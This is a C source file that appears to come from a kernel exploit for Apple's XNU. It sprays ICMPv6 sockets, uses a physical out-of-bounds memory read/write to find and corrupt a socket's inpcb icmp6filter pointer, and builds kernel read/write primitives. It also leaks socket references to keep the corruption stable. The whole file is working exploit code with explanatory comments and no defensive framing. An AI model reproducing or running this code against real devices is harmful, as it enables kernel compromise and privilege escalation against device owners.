#include "socket.h"

#include <errno.h>
#include <netinet/icmp6.h>
#include <netinet/in.h>
#include <pthread.h>
#include <stdlib.h>
#include <string.h>
#include <sys/fileport.h>
#include <sys/socket.h>
#include <unistd.h>

#include "krw.h"
#include "phys_oob.h"
#include "utils.h"

void krw_sockets_leak_forever(void) {
    /*
     struct inpcb {
         decl_lck_mtx_data(, inpcb_mtx);
         LIST_ENTRY(inpcb) inp_hash;
         LIST_ENTRY(inpcb) inp_list;
         void   *inp_ppcb;
         struct inpcbinfo *inp_pcbinfo;
         struct socket *inp_socket;
     */

    // get socket from inpcb->inp_socket
    uint64_t control_socket_addr = early_kread64(g_ctx.control_socket_pcb + g_ctx.offsets.inpcb_inp_socket);
    uint64_t rw_socket_addr = early_kread64(g_ctx.rw_socket_pcb + g_ctx.offsets.inpcb_inp_socket);
    if (control_socket_addr == 0 || rw_socket_addr == 0) {
        LOG_ERR("couldn't find control_socket_addr || rw_socket_addr");
        return;
    }

    offsets_t offsets = g_ctx.offsets;

    uint64_t control_socket_so_count = early_kread64(control_socket_addr + offsets.socket_so_count);
    uint64_t rw_socket_so_count = early_kread64(rw_socket_addr + offsets.socket_so_count);

    // increase ref count
    // so_usecount and so_retaincnt
    early_kwrite64(control_socket_addr + offsets.socket_so_count, control_socket_so_count + 0x0000100100001001);
    early_kwrite64(rw_socket_addr + offsets.socket_so_count, rw_socket_so_count + 0x0000100100001001);

    early_kwrite64(g_ctx.rw_socket_pcb + offsets.inpcb_icmp6filt + 0x8, 0);
}

uint64_t spray_socket(void) {
    // create socket icmpv6
    int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
    if (fd < 0) {
        LOG_ERR("socket create failed");
        return UINT64_MAX;
    }

    // turn socket into mach fileport
    mach_port_t output_socket_port = MACH_PORT_NULL;
    fileport_makeport(fd, &output_socket_port);
    close(fd);

    uint8_t* socket_info = calloc(1, 0x400);
    // this is to get inp_gencnt from inpcb to know which socket inpcb belongs to
    __proc_info(PROC_INFO_CALL_PIDFILEPORTINFO, getpid(), PROC_PIDFILEPORTSOCKETINFO, output_socket_port, socket_info, 0x400);

    uint64_t inp_gencnt = 0;
    // may need to check this offset for various versions
    memcpy(&inp_gencnt, socket_info + 0x110, sizeof(inp_gencnt));

    size_t idx = g_ctx.socket_ports_count++;

    // save output mach port from fileport_makeport
    g_ctx.socket_ports[idx] = output_socket_port;

    // save gencnt for this socket on this array
    g_ctx.socket_pcb_ids[idx] = inp_gencnt;

    return output_socket_port;
}

void sockets_release(void) {
    for (size_t i = 0; i < g_ctx.socket_ports_count; i++) {
        mach_port_deallocate(mach_task_self(), g_ctx.socket_ports[i]);
    }
    g_ctx.socket_ports_count = 0;
}

kern_return_t find_and_corrupt_socket(mach_port_t memory_object, mach_vm_offset_t seeking_offset, uint8_t* read_buffer, uint8_t* write_buffer, uint64_t target_inp_gencnt_list[MAX_SOCKETS_COUNT],
                                      size_t* target_inp_gencnt_count, bool do_read) {
    if (do_read) {
        physical_oob_read_mo_with_retry(memory_object, seeking_offset, g_ctx.oob_size, g_ctx.oob_offset, read_buffer);
    }

    uint64_t search_start_idx = 0;
    bool target_found = false;
    uint64_t pcb_start_offset = 0;
    offsets_t offsets = g_ctx.offsets;
    // this is not "corrupted", it's
    // just filter set to 0, and inp6_cksum and inp6_hops initialized to -1
    uint64_t corrupted_filter_marker = 0x0000ffffffffffff;
    void* found = NULL;

    do {
        // NOTE:
        // original exploit didn't use reverse_memmem, it would round down to the nearest 0x400 boundary and
        // assume inpcb base was that, that's not true for < 17?
        found = memmem(read_buffer + search_start_idx, g_ctx.oob_size - search_start_idx, g_ctx.executable_name, strlen(g_ctx.executable_name));
        if (found != NULL) {
            // hexdump(read_buffer, g_ctx.oob_size);
            uint64_t found_offset = (uint8_t*)found - read_buffer;
            void* filter_found = reverse_memmem(found, found_offset, &corrupted_filter_marker, sizeof(corrupted_filter_marker));
            if (filter_found != NULL) {
                uint64_t filter_offset = (uint8_t*)filter_found - read_buffer;
                if (filter_offset >= offsets.inpcb_icmp6filt + 0x8) {
                    pcb_start_offset = filter_offset - (offsets.inpcb_icmp6filt + 0x8);
                    target_found = true;
                    break;
                }
            }
        }
        search_start_idx += 0x400;
    } while (found != NULL && search_start_idx < g_ctx.oob_size);

    if (!target_found) {
        return KERN_FAILURE;
    }

    LOG("pcb_start_offset: %#llx", pcb_start_offset);
    uint64_t target_inp_gencnt = 0;
    memcpy(&target_inp_gencnt, read_buffer + pcb_start_offset + 0x78, sizeof(target_inp_gencnt));
    LOG("target_inp_gencnt: %#llx", target_inp_gencnt);

    // this would be the list head, le_prev points to inpcbhead struct not inpcb!
    if (target_inp_gencnt == g_ctx.socket_pcb_ids[g_ctx.socket_ports_count - 1]) {
        LOG("found last PCB");
        return KERN_FAILURE;
    }

    bool is_our_pcb = false;
    size_t control_socket_idx = 0;
    // find our controlled socket by comparing pcb gencnt
    for (size_t sock_idx = 0; sock_idx < g_ctx.socket_ports_count; sock_idx++) {
        if (g_ctx.socket_pcb_ids[sock_idx] == target_inp_gencnt) {
            is_our_pcb = true;
            control_socket_idx = sock_idx;
            break;
        }
    }
    // the pcb we found isn't ours
    if (!is_our_pcb) {
        LOG("found freed PCB page");
        return KERN_FAILURE;
    }

    // we already found this one
    for (size_t i = 0; i < *target_inp_gencnt_count; i++) {
        if (target_inp_gencnt_list[i] == target_inp_gencnt) {
            LOG("found old PCB page");
            return KERN_FAILURE;
        }
    }

    // save this gencnt so we don't try to corrupt it again, and we don't try to corrupt the same socket twice
    size_t gencnt_idx = (*target_inp_gencnt_count)++;
    target_inp_gencnt_list[gencnt_idx] = target_inp_gencnt;

    /*
    struct inpcb {
     decl_lck_mtx_data(, inpcb_mtx);
     LIST_ENTRY(inpcb) inp_hash;
     LIST_ENTRY(inpcb) inp_list;
        |
        |
        v
    struct {
        struct type *le_next;  // next element
        struct type *le_prev;  // address of previous next element
    } */

    // (inpcb->inp_list.le_prev)
    // points to previous next pointer
    // since new inpcb are inserted at the head of the list,
    // le_prev pointer will belong to a newer inpcb in the list
    // so we can subtract 0x20 to get the base of the next inpcb in the list
    uint64_t inp_list_next_pointer = *(uint64_t*)((uint8_t*)read_buffer + pcb_start_offset + 0x28) - 0x20;

    // pcb filter offset for the pcb we found oob
    uint64_t icmp6filter = *(uint64_t*)((uint8_t*)read_buffer + pcb_start_offset + offsets.inpcb_icmp6filt);
    LOG("inp_list_next_pointer: %#llx", inp_list_next_pointer);
    LOG("icmp6filter: %#llx", icmp6filter);

    // the one we found was the control socket, so the next one in the list will be rw socket
    g_ctx.rw_socket_pcb = inp_list_next_pointer;

    // since we'll write 0xf00, but we only want to overwrite 8 bytes, we need
    // to copy all data so we don't corrupt everything else
    memcpy(write_buffer, read_buffer, g_ctx.oob_size);  // 0xf00
    // set control socket pcb icmp6filter pointer field to rw_socket pcb + icmp6filt_offset
    // when we write to control socket icmp6filter, we'll control where rw_socket icmp6filter points to
    *(uint64_t*)((uint8_t*)write_buffer + pcb_start_offset + offsets.inpcb_icmp6filt) = inp_list_next_pointer + offsets.inpcb_icmp6filt;
    *(uint64_t*)((uint8_t*)write_buffer + pcb_start_offset + offsets.inpcb_icmp6filt + 8) = 0;

    LOG("corrupting icmp6filter pointer...");
    // we're corrupting ptr to this struct
    // 8*4 = 32 bytes
    // 32 byte prim
    /*
        struct icmp6_filter {
            u_int32_t icmp6_filt[8];
        };
    */
    while (true) {
        // write
        physical_oob_write_mo(memory_object, seeking_offset, g_ctx.oob_size, g_ctx.oob_offset, write_buffer);
        // read info back to check if we really corrupted
        physical_oob_read_mo_with_retry(memory_object, seeking_offset, g_ctx.oob_size, g_ctx.oob_offset, read_buffer);
        uint64_t new_icmp6filter = 0;
        memcpy(&new_icmp6filter, read_buffer + pcb_start_offset + offsets.inpcb_icmp6filt, sizeof(new_icmp6filter));
        if (new_icmp6filter == inp_list_next_pointer + offsets.inpcb_icmp6filt) {
            LOG("target corrupted: %#llx", new_icmp6filter);
            break;
        }
    }

    // convert back to fd
    int sock = fileport_makefd(g_ctx.socket_ports[control_socket_idx]);

    // test the prims
    socklen_t getsockopt_read_length = EARLY_KRW_LENGTH;
    memset(g_ctx.getsockopt_read_data, 0, EARLY_KRW_LENGTH);
    // this will read from rw_socket icmp6filter, not control_socket icmp6_filter due to the corruption
    int res = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, g_ctx.getsockopt_read_data, &getsockopt_read_length);
    if (res != 0) {
        LOG_ERR("getsockopt(control): %s (%d)", strerror(errno), errno);
        return KERN_FAILURE;
    }

    uint64_t marker = 0;
    memcpy(&marker, g_ctx.getsockopt_read_data, sizeof(marker));
    // since default value for icmp6filter is 0xffffffffffffffff
    // if we read something else, the corruption is successful
    if (marker != 0xffffffffffffffff) {
        LOG("found control_socket at idx: %#zx", control_socket_idx);
        g_ctx.control_socket = sock;
        // the PREVIOUS element in the list is NEXT in the list, because NEW inpcb are inserted at the head of the list
        // turn rw_socket back to fd
        g_ctx.rw_socket = fileport_makefd(g_ctx.socket_ports[control_socket_idx + 1]);
        return KERN_SUCCESS;
    }

    LOG("failed to corrupt control_socket at idx: %#zx", control_socket_idx);
    return KERN_FAILURE;  // whoever came up with returning -1 when success returns KERN_SUCCESS???
}
